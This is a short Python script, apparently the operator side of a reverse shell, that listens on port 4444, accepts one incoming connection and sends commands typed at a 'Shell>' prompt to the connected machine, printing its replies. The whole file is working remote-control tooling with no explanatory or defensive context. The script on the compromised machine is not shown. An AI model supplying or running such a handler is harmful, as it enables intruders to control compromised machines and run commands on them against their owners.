import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(1)

print("[*] Waiting for connection...")
client, addr = server.accept()
print(f"[*] Connection established from {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        client.send(b"exit")
        break
    client.send(command.encode())
    response = client.recv(4096).decode()
    print(response)

client.close()
server.close()
